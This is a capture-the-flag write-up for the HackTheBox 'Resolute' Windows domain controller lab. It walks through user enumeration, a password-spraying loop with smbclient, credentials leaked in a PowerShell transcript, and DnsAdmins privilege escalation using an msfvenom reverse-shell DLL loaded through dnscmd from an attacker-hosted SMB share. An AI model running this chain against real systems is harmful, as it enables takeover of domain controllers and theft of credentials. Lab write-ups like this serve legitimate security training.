# Resolute - HackTheBox WriteUp

![info](/images/resolute/info.png)

## Enumeration & Information Gathering
#### Scanning 

Namp Results:

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-30 13:54 EEST
Nmap scan report for 10.10.10.169
Host is up (0.059s latency).
Not shown: 65511 closed ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49688/tcp open  unknown
49712/tcp open  unknown
50056/tcp open  unknown
```

#### Service Enumeration 

Running enum4linux on against the target:

```
root@kali:~# enum4linux -a 10.10.10.169
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat May 30 14:00:39 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.10.169
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

--snipped--

 ============================= 
|    Users on 10.10.10.169    |
 ============================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail      Name: (null)      Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)      Desc: Built-in account for administering the computer/domain
index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela       Name: (null)      Desc: (null)
index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette      Name: (null)      Desc: (null)
index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika       Name: (null)      Desc: (null)
index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire       Name: (null)      Desc: (null)
index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude       Name: (null)      Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)      Desc: A user account managed by the system.
index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia      Name: (null)      Desc: (null)
index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred Name: (null)    Desc: (null)
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo      Name: (null)      Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus       Name: (null)      Desc: (null)
index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko NovakDesc: Account created. Password set to Welcome123!
index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie      Name: (null)      Desc: (null)
index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki        Name: (null)      Desc: (null)
index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo        Name: (null)      Desc: (null)
index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per  Name: (null)    Desc: (null)
index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan  Name: Ryan Bertrand       Desc: (null)
index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally        Name: (null)      Desc: (null)
index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon        Name: (null)      Desc: (null)
index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve        Name: (null)      Desc: (null)
index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie       Name: (null)      Desc: (null)
index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita       Name: (null)      Desc: (null)
index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf  Name: (null)    Desc: (null)
index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach Name: (null)    Desc: (null)

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
user:[marko] rid:[0x457]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]
user:[fred] rid:[0x19cd]
user:[angela] rid:[0x19ce]
user:[felicia] rid:[0x19cf]
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]
user:[stevie] rid:[0x19d2]
user:[claire] rid:[0x19d3]
user:[paulo] rid:[0x19d4]
user:[steve] rid:[0x19d5]
user:[annette] rid:[0x19d6]
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]
user:[claude] rid:[0x19d9]
user:[melanie] rid:[0x2775]
user:[zach] rid:[0x2776]
user:[simon] rid:[0x2777]
user:[naoki] rid:[0x2778]

 ============================== 
|    Groups on 10.10.10.169    |
 ============================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[+] Getting builtin groups:
group:[Account Operators] rid:[0x224]
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[System Managed Accounts Group] rid:[0x245]
group:[Storage Replica Administrators] rid:[0x246]
group:[Server Operators] rid:[0x225]
--snipped--
```

After analyzing the output, some interesting information can be seen

> Account: marko Name: Marko NovakDesc: Account created. Password set to Welcome123!

Let's try this credentials with smbclient:

```
root@kali:~# smbclient -L \\10.10.10.169 -U=marko%Welcome123!
session setup failed: NT_STATUS_LOGON_FAILURE
root@kali:~# 

```

It fails. Next thing would be to try this password on all the discovered users. But first, the usernames need to be extracted from the enum4linux output.

Using a awk, the usernames field can be easily extracted.

```
root@kali:~/pwn_share/Machines/Resolute# cat users_dirty | awk '{print $8}' > users.txt

Administrator
angela
annette
annika
claire
claude
DefaultAccount
felicia
fred
Guest
gustavo
krbtgt
marcus
marko
melanie
naoki
paulo
per
ryan
sally
simon
steve
stevie
sunita
ulf
zach
```
## Exploitation
#### Foothold 
Then with a bash oneline, the found password will be used to test authentication with smbclient against all usernames:

```
root@kali:~/pwn_share/Machines/Resolute# for i in $(cat users.txt); do echo testing with user $i; smbclient -L \\10.10.10.169 -U="$i%Welcome123!"; done

testing with user Administrator
session setup failed: NT_STATUS_LOGON_FAILURE
testing with user angela
session setup failed: NT_STATUS_LOGON_FAILURE
testing with user annette
session setup failed: NT_STATUS_LOGON_FAILURE
testing with user annika
session setup failed: NT_STATUS_LOGON_FAILURE
testing with user claire
session setup failed: NT_STATUS_LOGON_FAILURE
testing with user claude
session setup failed: NT_STATUS_LOGON_FAILURE
testing with user DefaultAccount
session setup failed: NT_STATUS_LOGON_FAILURE
testing with user felicia
session setup failed: NT_STATUS_LOGON_FAILURE
testing with user fred
session setup failed: NT_STATUS_LOGON_FAILURE
testing with user Guest
session setup failed: NT_STATUS_LOGON_FAILURE
testing with user gustavo
session setup failed: NT_STATUS_LOGON_FAILURE
testing with user krbtgt
session setup failed: NT_STATUS_LOGON_FAILURE
testing with user marcus
session setup failed: NT_STATUS_LOGON_FAILURE
testing with user marko
session setup failed: NT_STATUS_LOGON_FAILURE
testing with user melanie

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
testing with user naoki
session setup failed: NT_STATUS_LOGON_FAILURE
testing with user paulo
session setup failed: NT_STATUS_LOGON_FAILURE
testing with user per
session setup failed: NT_STATUS_LOGON_FAILURE
testing with user ryan
session setup failed: NT_STATUS_LOGON_FAILURE
testing with user sally
session setup failed: NT_STATUS_LOGON_FAILURE
testing with user simon
session setup failed: NT_STATUS_LOGON_FAILURE
testing with user steve
session setup failed: NT_STATUS_LOGON_FAILURE
testing with user stevie
session setup failed: NT_STATUS_LOGON_FAILURE
testing with user sunita
session setup failed: NT_STATUS_LOGON_FAILURE
testing with user ulf
session setup failed: NT_STATUS_LOGON_FAILURE
testing with user zach
session setup failed: NT_STATUS_LOGON_FAILURE
```

The result shows that the password works for melanie.

With this passowrd, it is now possible to authenticate to the system and this can be done via Window Remote management.

![evil_melanie](/images/resolute/evil_melanie.png)

Using Evil-WinRM, authentication is successful!

Using Evil-WinRM, authentication is successful!
And the user flag can also be read at this point 

![user](/images/resolute/user.png)


#### Post Exploitation Enumeration 

After enumerating files in folders on the target. A hidden folder is found in the "C" volumne:

With cmd.exe this would be "dir /a:h", but since the shell is powershell. the "dir -Force" command is used instead.

![hidden_dir](/images/resolute/hidden_dir.png) 

Printing the contents of the file in the directory, a potential password for the ryan user is discovered.

```
*Evil-WinRM* PS C:\PSTranscripts\20191203> type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
**********************
Windows PowerShell transcript start
Start time: 20191203063201
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
Command start time: 20191203063455
**********************
PS>TerminatingError(): "System error."
>> CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
>> CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="Stream"; value="True"
**********************
Command start time: 20191203063455
**********************
PS>ParameterBinding(Out-String): name="InputObject"; value="PS megabank\ryan@RESOLUTE Documents> "
PS megabank\ryan@RESOLUTE Documents>
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
```

User:ryan 
Password: Serv3r4Admin4cc123!

## Privilege Escalation 

Upon navigating to User Ryan's desktop, there is a note:

```
*Evil-WinRM* PS C:\Users\ryan\Desktop> type note.txt
Email to team:

- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute
*Evil-WinRM* PS C:\Users\ryan\Desktop>
```

This is good to keep in mind as it may affect how we interact with the system later.

Checking information about the ryan user shows that he belongs to the DNSadmin group which definetly sounds interesting.

```
*Evil-WinRM* PS C:\Users\melanie> whoami /all

USER INFORMATION
----------------

User Name     SID
============= ==============================================
megabank\ryan S-1-5-21-1392959593-3013219662-3596683436-1105


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ===============================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

A google search returns varios articles about exploiting this privillege.

Following one of the articles:

First getting the architecture type in order to use to right version of netcat for reverse shell

```
root@kali:/opt/impacket/examples# python3 getArch.py -target 10.10.10.169
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Gathering OS architecture for 1 machines
[*] Socket connect timeout set to 2 secs
10.10.10.169 is 64-bit
```
The arch is **64-bit**

Therefore, the listner and payload will be 64 bit.

The steps followed to achieve shell after reading the articles are as follows.

1. Create an x64 reverse shell payload with msfvenom
   
   ```root@kali:/var/www/html/pub# msfvenom -p windows/x64/shell/reverse_tcp LHOST=10.10.14.41 LPORT=9001 -f dll  > spluggin.dll```

   -a for architechture, however, leaving it out defaults to x64.

2. Serve the the dll with impacket smb (you can see when the remote host pulls the file after the dnscmd
   ```root@kali:/var/www/html/pub# /opt/impacket/examples/smbserver.py share .```
   
3. Set up a multi handler with a same x64 reverse shell payload and run it
   
4. On the target, execute the dnscmd using to call the malicious dll from the smb share, then stop and start the dns server.
   
   ```
   C:\Users\Ryan> dnscmd.exe  /config /serverlevelplugindll \\10.10.14.41\share\spluggin.dll

   sc.exe stop dns
   sc.exe start dns
   ```

![dnsadmin](/images/resolute/dnsadmin.png)

A systmem shell is received!

![root](/images/resolute/root.png)

Conclusion:

I got a little emotional seeing this box retire since it was my first one on HackTheBox 6 months before the time of this posting. 
This box thought me a lot as a begineer, I was introduced to evil-winrm and Impacket, learned some basic windows enumeration, struggled and learned how to chosse the right msfvenom payloads and learned how to exploit the DNSAdmin Group for priviledge escalation.

Thanks to the creators of the box!

LateComerz out!

<img src="https://www.hackthebox.eu/badge/image/206328" alt="Hack The Box">
